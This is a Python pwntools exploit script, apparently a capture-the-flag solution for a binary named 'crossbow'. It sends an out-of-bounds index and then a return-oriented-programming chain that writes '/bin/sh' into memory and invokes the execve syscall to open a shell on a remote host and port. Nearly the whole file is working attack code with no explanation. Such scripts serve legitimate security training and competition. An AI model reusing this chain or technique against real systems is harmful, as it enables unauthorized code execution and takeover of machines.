from pwn import *

gs = '''
b *training+126
continue
'''

elf = context.binary = ELF("./crossbow")

def start():
    if args.REMOTE:
        return remote("94.237.63.39", 33481)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

pop_rdi = 0x0000000000401d6c # pop rdi ; ret
pop_rsi = 0x000000000040566b # pop rsi ; ret
syscall = 0x00000000004015d3 # syscall
data = 0x000000000040e000 # data
pop_rax = 0x0000000000401001 # pop rax ; ret
mov_qword_ptr_rdi_rax = 0x00000000004020f5 # mov qword ptr [rdi], rax ; ret
pop_rdx = 0x0000000000401139 # pop rdx ; ret

payload = b"".join([
    b"A"*8,
    p64(pop_rdi),
    p64(data),
    p64(pop_rax),
    b"/bin/sh\x00",
    p64(mov_qword_ptr_rdi_rax),
    p64(pop_rdx),
    p64(0x0),
    p64(pop_rsi),
    p64(0x0),
    p64(pop_rax),
    p64(0x3b),
    p64(syscall)
])

io.sendlineafter("Select target to shoot: ", b"-2")

io.sendlineafter("> ", payload)

io.interactive()